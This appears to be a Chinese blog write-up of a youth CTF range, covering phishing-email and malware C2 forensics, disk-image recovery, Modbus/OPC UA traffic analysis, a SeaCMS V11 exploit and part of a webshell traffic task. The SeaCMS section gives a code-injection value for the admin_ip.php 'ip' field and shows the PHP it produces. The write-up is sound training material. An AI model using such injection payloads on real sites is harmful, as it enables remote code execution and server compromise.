+<p>按照要求去看看这个文件夹</p>
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/%E9%9D%92%E5%B0%91%E5%B9%B4CTF%E9%9D%B6%E5%9C%BA/1767071491397-bfdf052a-e1c9-483c-a3a6-7d69fbff5f31.png" srcset="/img/loading.gif" lazyload></p>
+<p>就一个文件，按照刚刚的方法提取即可</p>
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/%E9%9D%92%E5%B0%91%E5%B9%B4CTF%E9%9D%B6%E5%9C%BA/1767071962985-376fd0a4-9fd0-482a-95f4-57cb2145b5d3.png" srcset="/img/loading.gif" lazyload></p>
+<p>发现是一个未加密的，直接就能打开了</p>
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/%E9%9D%92%E5%B0%91%E5%B9%B4CTF%E9%9D%B6%E5%9C%BA/1767072021183-f80ced46-c984-4ff4-9b52-e27fd0b99372.png" srcset="/img/loading.gif" lazyload></p>
+<p>这边把发件人收件人都写清楚了</p>
+<p>所以答案就是flag{<a href="mailto:&#x31;&#57;&#56;&#51;&#57;&#50;&#x39;&#x32;&#50;&#x33;&#x40;&#x71;&#113;&#46;&#99;&#x6f;&#x6d;">1983929223@qq.com</a>}</p>
+<h2 id="任务六：提交发送邮件的IP"><a href="#任务六：提交发送邮件的IP" class="headerlink" title="任务六：提交发送邮件的IP"></a>任务六：提交发送邮件的IP</h2><!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/%E9%9D%92%E5%B0%91%E5%B9%B4CTF%E9%9D%B6%E5%9C%BA/1767072108103-d7cb52f4-0629-4171-b399-db2f3e627118.png" srcset="/img/loading.gif" lazyload></p>
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/%E9%9D%92%E5%B0%91%E5%B9%B4CTF%E9%9D%B6%E5%9C%BA/1767072204217-3e647204-55fd-4011-a047-b5d9f254d689.png" srcset="/img/loading.gif" lazyload></p>
+<p>直接记事本打开刚刚的邮件文件</p>
+<p>在X-Originating-IP字段即可发现ip</p>
+<p>所以答案就是flag{39.91.141.213}</p>
+<h2 id="任务七：提交钓鱼附件中的C2地址"><a href="#任务七：提交钓鱼附件中的C2地址" class="headerlink" title="任务七：提交钓鱼附件中的C2地址"></a>任务七：<font style="color:rgba(0, 0, 0, 0.88);">提交钓鱼附件中的C2地址</font></h2><!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/%E9%9D%92%E5%B0%91%E5%B9%B4CTF%E9%9D%B6%E5%9C%BA/1767072248374-2a6022b7-1cde-4bad-bd0a-bce34ff8e620.png" srcset="/img/loading.gif" lazyload></p>
+<p>我们下载刚刚邮件的附件，即可得到病毒文件</p>
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/%E9%9D%92%E5%B0%91%E5%B9%B4CTF%E9%9D%B6%E5%9C%BA/1767072321379-fac6415e-da3e-411e-96c2-ea0e279115a0.png" srcset="/img/loading.gif" lazyload></p>
+<p>一解压就被火绒灭了，我们关掉火绒保存</p>
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/%E9%9D%92%E5%B0%91%E5%B9%B4CTF%E9%9D%B6%E5%9C%BA/1767072388891-24fe07ca-611c-4c0f-a24a-bf2ed065f5a4.png" srcset="/img/loading.gif" lazyload></p>
+<p>一看就是通过这个钓鱼附件，利用可能隐藏后缀的特性，诱骗使用者打开这个木马病毒</p>
+<p>要查C2地址，我们扔到微步云沙箱看看</p>
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/%E9%9D%92%E5%B0%91%E5%B9%B4CTF%E9%9D%B6%E5%9C%BA/1767094281741-c4c4589d-2855-4e80-80af-62996c35388a.png" srcset="/img/loading.gif" lazyload></p>
+<p>检测出来确实是恶意木马</p>
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/%E9%9D%92%E5%B0%91%E5%B9%B4CTF%E9%9D%B6%E5%9C%BA/1767094443961-14b8cd47-da03-441a-b5e8-adeae05d9fd9.png" srcset="/img/loading.gif" lazyload></p>
+<p>可以看到这边检测出来俩ip，很明显下边的是C2地址，因为上边的是国内的CDN服务器，作为公开的基础设施，不太会把这玩意当C2服务器，毕竟无法控制</p>
+<p>而下边的又是境外的，又是动态IP，很符合隐匿的一个需求，所以锁定是下边的IP</p>
+<p>flag{182.9.80.123}</p>
+<h2 id="任务八：恢复备份"><a href="#任务八：恢复备份" class="headerlink" title="任务八：恢复备份"></a>任务八：恢复备份</h2><!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/%E9%9D%92%E5%B0%91%E5%B9%B4CTF%E9%9D%B6%E5%9C%BA/1767094831694-6c05147b-284e-4290-91a1-370f9214520b.png" srcset="/img/loading.gif" lazyload></p>
+<p>我们定位到这个地方去看看备份呢</p>
+<p>diskgenius（题目打错了吧）是很常见的用于恢复的软件</p>
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/%E9%9D%92%E5%B0%91%E5%B9%B4CTF%E9%9D%B6%E5%9C%BA/1767095240717-404e84da-c129-4ff3-a158-fd90f8d50130.png" srcset="/img/loading.gif" lazyload></p>
+<p>在指定目录可以看到一个20G磁盘的镜像，我们利用DiskGenius加载一下这个镜像文件</p>
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/%E9%9D%92%E5%B0%91%E5%B9%B4CTF%E9%9D%B6%E5%9C%BA/1767095530756-89b87a2a-fc65-464a-8440-41d2ec30b2a2.png" srcset="/img/loading.gif" lazyload></p>
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/%E9%9D%92%E5%B0%91%E5%B9%B4CTF%E9%9D%B6%E5%9C%BA/1767095709035-bfd5e5f8-6100-44b5-8ed4-e9e77da6ae07.png" srcset="/img/loading.gif" lazyload></p>
+<p>加载完那个pmfx文件后即可在\Users\Solar\Desktop处找到flag.bak文件</p>
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/%E9%9D%92%E5%B0%91%E5%B9%B4CTF%E9%9D%B6%E5%9C%BA/1767095975271-e652d388-0610-486d-a1c1-79bd80f8e1f4.png" srcset="/img/loading.gif" lazyload></p>
+<p>直接打不开，可以提取出来看或者直接改后缀成txt看</p>
+<p>得到flag{92047522e5080bad36eda9d29d5a163e}</p>
+<h1 id="工厂应急"><a href="#工厂应急" class="headerlink" title="工厂应急"></a>工厂应急</h1><!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/%E9%9D%92%E5%B0%91%E5%B9%B4CTF%E9%9D%B6%E5%9C%BA/1767097169379-cfe626f8-1ea7-4ce5-b383-c537805fe2ae.png" srcset="/img/loading.gif" lazyload></p>
+<p>记得在面试的时候c3师傅跟我说过，在实战的时候取证很多时候是碰不到实体和镜像的，更多是流量。我想或许说的就是和这一题一样的流量实战，来做一下这一题吧</p>
+<h2 id="任务一：谁把泵关了？"><a href="#任务一：谁把泵关了？" class="headerlink" title="任务一：谁把泵关了？"></a>任务一：谁把泵关了？</h2><!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/%E9%9D%92%E5%B0%91%E5%B9%B4CTF%E9%9D%B6%E5%9C%BA/1767097278034-6270211a-e989-4f71-837b-69fd2fbd0d09.png" srcset="/img/loading.gif" lazyload></p>
+<p>首先认清这是个化工厂，在这个化工厂里有人把泵给关了</p>
+<p>我们要找到是谁关的，找到他的id</p>
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/%E9%9D%92%E5%B0%91%E5%B9%B4CTF%E9%9D%B6%E5%9C%BA/1767152949208-02aaa43e-a0e0-40be-9bc4-a9afa9dd0c9b.png" srcset="/img/loading.gif" lazyload></p>
+<p>打开流量包可以看到有很明显的Modbus流量痕迹，Modbus TCP是一种很特殊的协议</p>
+<p>这是一种广泛运用于工业自动化领域的通信协议，主要是用来解决不同厂家生成的设备沟通传输的问题，正贴切本题的工厂应急环境，这应该是本题的重点，我们先过滤一下Modbus TCP</p>
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/%E9%9D%92%E5%B0%91%E5%B9%B4CTF%E9%9D%B6%E5%9C%BA/1767153543771-d9bc99e8-795d-4f2e-b5a1-a45dc8dc537f.png" srcset="/img/loading.gif" lazyload></p>
+<p>直接输入modbus即可过滤</p>
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/%E9%9D%92%E5%B0%91%E5%B9%B4CTF%E9%9D%B6%E5%9C%BA/1767153697396-118691c8-14e6-49d5-af78-260cdda97e60.png" srcset="/img/loading.gif" lazyload></p>
+<p>重点在于Info内容</p>
+<p>这边的Trans是事务标识符，用来匹配请求和响应</p>
+<p>Unit是单元标识符，基本上就意味着从站的地址</p>
+<p>最后就是Func了，这是功能码，决定着要做什么操作</p>
+<p>像这边的Func：1是读线圈、Func：3是读保持寄存器</p>
+<p>这一题我们可以看到问的是关泵的人</p>
+<p>读操作只会查询和监视，不会改变任何的设备实际状态，因此这一题很明显应该要去写操作里边找</p>
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/%E9%9D%92%E5%B0%91%E5%B9%B4CTF%E9%9D%B6%E5%9C%BA/1767154504908-e657e3e4-b2ae-494b-b446-48b61623bf48.png" srcset="/img/loading.gif" lazyload></p>
+<p>一般的写操作就是5，6，15，16</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plain">modbus.func_code == 5 or modbus.func_code == 6 or modbus.func_code == 15 or modbus.func_code == 16<br></code></pre></td></tr></table></figure>
+
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/%E9%9D%92%E5%B0%91%E5%B9%B4CTF%E9%9D%B6%E5%9C%BA/1767154559398-a0302362-d139-4296-8799-c71c475ee9ca.png" srcset="/img/loading.gif" lazyload></p>
+<p>过滤出来就只有一条</p>
+<p>当然了，不放心也可以自己看看，发现确实是只有一条写操作</p>
+<p>这是一个单线圈的功能码，我们看看具体内容</p>
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/%E9%9D%92%E5%B0%91%E5%B9%B4CTF%E9%9D%B6%E5%9C%BA/1767154889584-e863f6c1-d2c6-4316-950f-2314988171ed.png" srcset="/img/loading.gif" lazyload></p>
+<p>可以看到data写了0000，在Modbus协议里0000表示停止和OFF</p>
+<p>这一条数据的完整含义就是向1号从站设备下达命令，使其将第13号线圈关了，也就是所谓的关泵操作</p>
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/%E9%9D%92%E5%B0%91%E5%B9%B4CTF%E9%9D%B6%E5%9C%BA/1767155036440-a1b4aab3-4e9a-4c53-9dd2-ef7ae3d0c68c.png" srcset="/img/loading.gif" lazyload></p>
+<p>那很明确了</p>
+<p>0xtransaction_id&#x3D;6699&#x3D;0x1a2b</p>
+<p>0xfunction_code&#x3D;5&#x3D;0x05</p>
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/%E9%9D%92%E5%B0%91%E5%B9%B4CTF%E9%9D%B6%E5%9C%BA/1767155208201-ece306c7-080b-49c8-940a-6ed8d81c925a.png" srcset="/img/loading.gif" lazyload></p>
+<p>0xcoil_address&#x3D;13&#x3D;0x000d</p>
+<p>所以flag就是flag{0x1a2b_0x05_0x000d}</p>
+<h2 id="任务二：找到被写入的NodeId"><a href="#任务二：找到被写入的NodeId" class="headerlink" title="任务二：找到被写入的NodeId"></a>任务二：找到被写入的NodeId</h2><!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/%E9%9D%92%E5%B0%91%E5%B9%B4CTF%E9%9D%B6%E5%9C%BA/1767156128551-02ec5817-937c-44e2-a98a-7a054cbe82c7.png" srcset="/img/loading.gif" lazyload></p>
+<p>首先，什么是NodeId，我们先搜索看看这个字符串，看看到底是什么</p>
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/%E9%9D%92%E5%B0%91%E5%B9%B4CTF%E9%9D%B6%E5%9C%BA/1767159055051-f14e3fc9-33b5-4bbf-8da2-76dd7f84b1b0.png" srcset="/img/loading.gif" lazyload></p>
+<p>追踪一下TCP流看看详情</p>
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/%E9%9D%92%E5%B0%91%E5%B9%B4CTF%E9%9D%B6%E5%9C%BA/1767159072428-52943efd-af29-4db5-9958-007cdf13828f.png" srcset="/img/loading.gif" lazyload></p>
+<p>发现是这样子的，具体什么意思呢？可以问问看ai</p>
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/%E9%9D%92%E5%B0%91%E5%B9%B4CTF%E9%9D%B6%E5%9C%BA/1767159028119-9a4300a5-b4e1-4f25-8a84-605726eca684.png" srcset="/img/loading.gif" lazyload></p>
+<p>至此我们了解了，这一个NodeId是节点标识符的意思，而这一条流量的意思是发出一个浏览请求，希望能读到在命名空间索引为3的，标识符为Alarms的节点（就是要报警信息列表）</p>
+<p>那我们要找的是被写入的，自然应该是WriteRequest才对</p>
+<p>根据内容过滤看看</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plain">frame contains  &quot;NodeId&quot; &amp;&amp; frame contains &quot;WriteRequest&quot;<br></code></pre></td></tr></table></figure>
+
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/%E9%9D%92%E5%B0%91%E5%B9%B4CTF%E9%9D%B6%E5%9C%BA/1767159352969-014f16b0-fb81-4c4f-a2ac-e2676f3429dd.png" srcset="/img/loading.gif" lazyload></p>
+<p>成功过滤，就一条数据</p>
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/%E9%9D%92%E5%B0%91%E5%B9%B4CTF%E9%9D%B6%E5%9C%BA/1767159377376-ffaef7f7-3482-4202-ae34-674b2a50de1e.png" srcset="/img/loading.gif" lazyload></p>
+<p>所以本题flag即为flag{ns&#x3D;2;s&#x3D;Pump&#x2F;SpeedSetpoint}</p>
+<p>这个NodeId的意思是找到命名空间索引为2的，更改泵的转速，改成1200</p>
+<h2 id="任务三：找出工程站域名解析IP"><a href="#任务三：找出工程站域名解析IP" class="headerlink" title="任务三：找出工程站域名解析IP"></a>任务三：找出工程站域名解析IP</h2><!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/%E9%9D%92%E5%B0%91%E5%B9%B4CTF%E9%9D%B6%E5%9C%BA/1767159544053-ada53cd4-8d28-4ae5-b07e-ef59f1c6804d.png" srcset="/img/loading.gif" lazyload></p>
+<p>找域名解析结果？听上去就是找的DNS协议的流量吧</p>
+<p>过滤一下</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plain">dns &amp;&amp; (dns.qry.name == &quot;engws.plant.local&quot;)<br></code></pre></td></tr></table></figure>
+
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/%E9%9D%92%E5%B0%91%E5%B9%B4CTF%E9%9D%B6%E5%9C%BA/1767159790959-32a47889-ef11-4d35-9ec2-f313a2e371f5.png" srcset="/img/loading.gif" lazyload></p>
+<p>差不多长这样子</p>
+<p>这边有很多ip，根据题意，我们最后应该解析到的是一个和其他工控设备都在同一网段的ip，如此满足工控系统的实时要求，保证网络安全和通信协议，也就是10.0.0.x的ip</p>
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/%E9%9D%92%E5%B0%91%E5%B9%B4CTF%E9%9D%B6%E5%9C%BA/1767159865768-0d66a919-db26-4dda-9202-7820b1794ce3.png" srcset="/img/loading.gif" lazyload></p>
+<p>找了一圈发现只有10.0.0.8.所以答案就是这个ip，把域名解析成了这个ip</p>
+<p>flag{10.0.0.8}</p>
+<h2 id="任务四：确定HMI到工程站上首个成功发起的时间点"><a href="#任务四：确定HMI到工程站上首个成功发起的时间点" class="headerlink" title="任务四：确定HMI到工程站上首个成功发起的时间点"></a>任务四：确定HMI到工程站上首个成功发起的时间点</h2><!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/%E9%9D%92%E5%B0%91%E5%B9%B4CTF%E9%9D%B6%E5%9C%BA/1767160211549-f2e66b48-3948-48f4-b06f-05ae3b12a3ca.png" srcset="/img/loading.gif" lazyload></p>
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/%E9%9D%92%E5%B0%91%E5%B9%B4CTF%E9%9D%B6%E5%9C%BA/1767160289516-f928a254-b538-445c-a6ea-20e39e42bd9f.png" srcset="/img/loading.gif" lazyload></p>
+<p>根据任务三，这边可以看到DNS服务器是10.0.0.2，客户端是10.0.0.5，然后访问engws.plant.local的时候会连接目标ip10.0.0.8</p>
+<p>在工控网络场景里，HMI一般是作为的操作终端，也就是客户端，需要访问工程控制站，也就是说一般是HMI向DNS发起查询，而解析结果就是工程站的ip</p>
+<p>所以本题里说的HMI的源是10.0.0.5，而工程站是10.0.0.8</p>
+<p>这个都知道了，我们直接过滤即可，src是10.0.0.5，而dst是10.0.0.8，tcp连接</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plain">ip.src == 10.0.0.5 &amp;&amp; ip.dst == 10.0.0.8 &amp;&amp;tcp<br></code></pre></td></tr></table></figure>
+
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/%E9%9D%92%E5%B0%91%E5%B9%B4CTF%E9%9D%B6%E5%9C%BA/1767160814780-baac8735-0b42-4acf-85b1-c6c910ec49c9.png" srcset="/img/loading.gif" lazyload></p>
+<p>过滤后顺序时间，可不就看到了首个成功发起的时间点</p>
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/%E9%9D%92%E5%B0%91%E5%B9%B4CTF%E9%9D%B6%E5%9C%BA/1767160868841-a164a1aa-b86a-4b9b-b2b8-6a7bfcb1e0d1.png" srcset="/img/loading.gif" lazyload></p>
+<p>所以flag就是这一个，注意要UTC的</p>
+<p>flag{2025-03-12T14:22:09Z}</p>
+<h2 id="任务五：找到HMI对工程站发起的HTTP请求"><a href="#任务五：找到HMI对工程站发起的HTTP请求" class="headerlink" title="任务五：找到HMI对工程站发起的HTTP请求"></a>任务五：找到HMI对工程站发起的HTTP请求</h2><!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/%E9%9D%92%E5%B0%91%E5%B9%B4CTF%E9%9D%B6%E5%9C%BA/1767161699259-7ca300bb-73c5-4f2c-bcb0-a080a75e2147.png" srcset="/img/loading.gif" lazyload></p>
+<p>我们在任务四已经分析过了，HMI是10.0.0.5，而工程站是10.0.0.8，最后要求是HTTP请求</p>
+<p>所以我们多过滤个HTTP即可</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plain">ip.src == 10.0.0.5 &amp;&amp; ip.dst == 10.0.0.8 &amp;&amp; http.request<br></code></pre></td></tr></table></figure>
+
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/%E9%9D%92%E5%B0%91%E5%B9%B4CTF%E9%9D%B6%E5%9C%BA/1767161823318-8279ba79-cc37-4cd0-9d19-0e01fd503686.png" srcset="/img/loading.gif" lazyload></p>
+<p>一下子就出来了，主要是因为这个流量包比较小</p>
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/%E9%9D%92%E5%B0%91%E5%B9%B4CTF%E9%9D%B6%E5%9C%BA/1767161887677-05934b5d-e007-4b94-8ce5-0225e7b4f380.png" srcset="/img/loading.gif" lazyload></p>
+<p>所以本题的flag就是flag{engws.plant.local_&#x2F;rpc}</p>
+<h1 id="SeaCMS-V11"><a href="#SeaCMS-V11" class="headerlink" title="SeaCMS V11"></a>SeaCMS V11</h1><!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/%E9%9D%92%E5%B0%91%E5%B9%B4CTF%E9%9D%B6%E5%9C%BA/1767272692792-9b0f783e-4521-441a-85de-c8d3d7675e6e.png" srcset="/img/loading.gif" lazyload></p>
+<p>这一是一道漏洞利用题，其实不是应急响应，但是在靶场就一起打了吧，就一个任务，漏洞还挺多的，我就写一个，之后专门开个专题搞漏洞，别的还是看看下边的师傅吧</p>
+<p><a target="_blank" rel="noopener" href="https://moxin1044.github.io/posts/d051/index.html">https://moxin1044.github.io/posts/d051/index.html</a></p>
+<h2 id="任务一：入侵环境"><a href="#任务一：入侵环境" class="headerlink" title="任务一：入侵环境"></a>任务一：入侵环境</h2><!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/%E9%9D%92%E5%B0%91%E5%B9%B4CTF%E9%9D%B6%E5%9C%BA/1767272707966-6d323c44-83f5-4559-8fc4-88c8fc03e076.png" srcset="/img/loading.gif" lazyload></p>
+<p>说漏洞多其实主要还是因为这边有很多php都是一点过滤都没有，随便就可以执行代码了</p>
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/%E9%9D%92%E5%B0%91%E5%B9%B4CTF%E9%9D%B6%E5%9C%BA/1767272999779-96921c96-de3a-4fbb-9352-8a1c1455257b.png" srcset="/img/loading.gif" lazyload></p>
+<p>我们先打开phpstudy，启动网站</p>
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/%E9%9D%92%E5%B0%91%E5%B9%B4CTF%E9%9D%B6%E5%9C%BA/1767273056207-c5511ef9-407a-4e16-85f1-459792df8799.png" srcset="/img/loading.gif" lazyload></p>
+<p>可以看到前台，加上url进入后台</p>
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/%E9%9D%92%E5%B0%91%E5%B9%B4CTF%E9%9D%B6%E5%9C%BA/1767273089553-a70da753-d39e-4e0d-8112-f4211f6cc8b8.png" srcset="/img/loading.gif" lazyload></p>
+<p>都输入admin即可进入</p>
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/%E9%9D%92%E5%B0%91%E5%B9%B4CTF%E9%9D%B6%E5%9C%BA/1767273159292-eb686f17-e381-413b-9189-0f7e49808af4.png" srcset="/img/loading.gif" lazyload></p>
+<p>接下来看看网站的代码，在小皮可以看到物理路径</p>
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/%E9%9D%92%E5%B0%91%E5%B9%B4CTF%E9%9D%B6%E5%9C%BA/1767273209369-3d015f3d-5eae-45ee-b6f9-bfcbedd6a787.png" srcset="/img/loading.gif" lazyload></p>
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/%E9%9D%92%E5%B0%91%E5%B9%B4CTF%E9%9D%B6%E5%9C%BA/1767273303582-9ed1d55e-828f-457f-b3ac-43da522c089a.png" srcset="/img/loading.gif" lazyload></p>
+<p>我们前往后台网站的代码存储路径下，全部提取出来（因为这个是直接本地搭的网站，所以这个flag.txt直接就在文件夹里能找到了，但题目本意是让我们找漏洞提取）</p>
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/%E9%9D%92%E5%B0%91%E5%B9%B4CTF%E9%9D%B6%E5%9C%BA/1767273515194-2a14026e-b944-4561-bfd3-f8e357bb41aa.png" srcset="/img/loading.gif" lazyload></p>
+<p>不是我说这个环境是真的卡的要命啊。。</p>
+<p>不如去github下环境复现</p>
+<p><a target="_blank" rel="noopener" href="https://github.com/seacms-net/CMS/releases/tag/V11">https://github.com/seacms-net/CMS/releases/tag/V11</a></p>
+<p>提出来之后我们可以看到光是admin_ip.php这边就有问题了，这边是直接将用户提交的POST参数v和ip直接字符串拼接的，然后直接写入PHP配置文件ip.php</p>
+<p>如果ip字段不正常呢，直接就被利用了</p>
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/%E9%9D%92%E5%B0%91%E5%B9%B4CTF%E9%9D%B6%E5%9C%BA/1767273961123-ef1696f2-4729-48a9-88fc-7fb65924a473.png" srcset="/img/loading.gif" lazyload></p>
+<p>假设我在ip字段输入了</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plain">&quot;;phpinfo(); //<br></code></pre></td></tr></table></figure>
+
+<p>那我们的ip.php就会直接变成</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plain">&lt;?php $v = &quot;&quot;; $ip = &quot;&quot;; phpinfo(); //&quot;; ?&gt;<br></code></pre></td></tr></table></figure>
+
+<p>然后服务器就直接干phpinfo()函数了，直接泄露了</p>
+<p>所以这边是有问题的，也就是可以利用的点</p>
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/%E9%9D%92%E5%B0%91%E5%B9%B4CTF%E9%9D%B6%E5%9C%BA/1767274354245-969071c1-f9e1-4a75-bca1-e1b714b71426.png" srcset="/img/loading.gif" lazyload></p>
+<p>直接在这边写进去就好了，写啥都行</p>
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/%E9%9D%92%E5%B0%91%E5%B9%B4CTF%E9%9D%B6%E5%9C%BA/1767274511449-829f4110-46e4-4ad5-95d3-578c7527f4ed.png" srcset="/img/loading.gif" lazyload></p>
+<p>写刚刚的直接进phpinfo界面了</p>
+<p>所以我们干啥命令都行了，直接提取flag即可，太卡了我受不了了，以后看我写漏洞再写吧</p>
+<h1 id="emergency"><a href="#emergency" class="headerlink" title="emergency"></a>emergency</h1><!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/%E9%9D%92%E5%B0%91%E5%B9%B4CTF%E9%9D%B6%E5%9C%BA/1767275652210-a6d64216-2a93-4d5d-9699-b30ff0b639d9.png" srcset="/img/loading.gif" lazyload></p>
+<p>青少年靶场最后一题了，写完就没了，确实是有点少，也不知道什么时候上第二届solar的题目</p>
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/%E9%9D%92%E5%B0%91%E5%B9%B4CTF%E9%9D%B6%E5%9C%BA/1767320407608-bdc06b9a-f003-47e0-8a33-d9ece116f310.png" srcset="/img/loading.gif" lazyload></p>
+<p>给了个虚拟磁盘，我们可以直接加到现有的虚拟机中</p>
+<p>当然也可以新创一个</p>
+<p>只需在硬盘设置的时候选择“使用现有虚拟磁盘”然后再选择vmdk文件即可</p>
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/%E9%9D%92%E5%B0%91%E5%B9%B4CTF%E9%9D%B6%E5%9C%BA/1767320482090-6115fb28-9382-4d13-b620-a0fac2304259.png" srcset="/img/loading.gif" lazyload></p>
+<h2 id="任务一：提交黑客的IP地址"><a href="#任务一：提交黑客的IP地址" class="headerlink" title="任务一：提交黑客的IP地址"></a>任务一：提交黑客的IP地址</h2><!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/%E9%9D%92%E5%B0%91%E5%B9%B4CTF%E9%9D%B6%E5%9C%BA/1767278564501-c025b820-79cb-4b24-8ce4-2539197bda74.png" srcset="/img/loading.gif" lazyload></p>
+<p>寻找黑客的踪迹，根据题目安全工程师开了流量包，让我们去看看这个流量包里藏了点啥</p>
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/%E9%9D%92%E5%B0%91%E5%B9%B4CTF%E9%9D%B6%E5%9C%BA/1767288270483-0b21fdc7-2e25-4d49-8365-4107b42be751.png" srcset="/img/loading.gif" lazyload></p>
+<p>过滤一下就可以发现最多出现的ip就是10.0.100.69，发现是大量的10.0.100.69发给10.0.100.13，很可疑，可以先留意一下，不能直接拿来判断</p>
+<p>根据下边的题目可以得知上传了一句话木马，那我们其实可以直接过滤POST的http请求，然后再追踪看看有没有明显的一句话木马痕迹</p>
+<p>简单追踪一下HTTP流，打开第一个就看见了一句话木马的痕迹</p>
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/%E9%9D%92%E5%B0%91%E5%B9%B4CTF%E9%9D%B6%E5%9C%BA/1767322499972-a3510d41-876f-47a8-8d9f-4d710eca0e7a.png" srcset="/img/loading.gif" lazyload></p>
+<p>后边还显示操作成功了</p>
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/%E9%9D%92%E5%B0%91%E5%B9%B4CTF%E9%9D%B6%E5%9C%BA/1767322484776-857ddbb7-5b39-4b82-ba9d-c8998f82b95c.png" srcset="/img/loading.gif" lazyload></p>
+<p>所以我们就可以直接追踪这个ip了，发现确实就是10.0.100.69向10.0.100.13发去的</p>
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/%E9%9D%92%E5%B0%91%E5%B9%B4CTF%E9%9D%B6%E5%9C%BA/1767322374606-f2d1a901-1eb4-496f-b354-f33fade25e48.png" srcset="/img/loading.gif" lazyload></p>
+<p>所以黑客的IP地址就是flag{10.0.100.69}</p>
+<h2 id="任务二：提交初始连接的一句话木马密码"><a href="#任务二：提交初始连接的一句话木马密码" class="headerlink" title="任务二：提交初始连接的一句话木马密码"></a>任务二：提交初始连接的一句话木马密码</h2><!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/%E9%9D%92%E5%B0%91%E5%B9%B4CTF%E9%9D%B6%E5%9C%BA/1767321058659-8d7e5a2c-b35c-4bab-83ed-17f8c4565e77.png" srcset="/img/loading.gif" lazyload></p>
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/%E9%9D%92%E5%B0%91%E5%B9%B4CTF%E9%9D%B6%E5%9C%BA/1767322553761-4fbff05d-cc68-473f-821e-70b1933e01cf.png" srcset="/img/loading.gif" lazyload></p>
+<p>上一题已经找到了一句话木马的痕迹，我们url解码一下</p>
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/%E9%9D%92%E5%B0%91%E5%B9%B4CTF%E9%9D%B6%E5%9C%BA/1767321129721-cccf1272-1e4e-4623-b363-b9891a6dcc88.png" srcset="/img/loading.gif" lazyload></p>
+<p>所以密码是shell</p>
+<p>flag{shell}</p>
+<h2 id="任务三：提交创建的新的一句话木马文件的MD5"><a href="#任务三：提交创建的新的一句话木马文件的MD5" class="headerlink" title="任务三：提交创建的新的一句话木马文件的MD5"></a>任务三：提交创建的新的一句话木马文件的MD5</h2><!-- 这是一张图片，ocr 内容为： -->
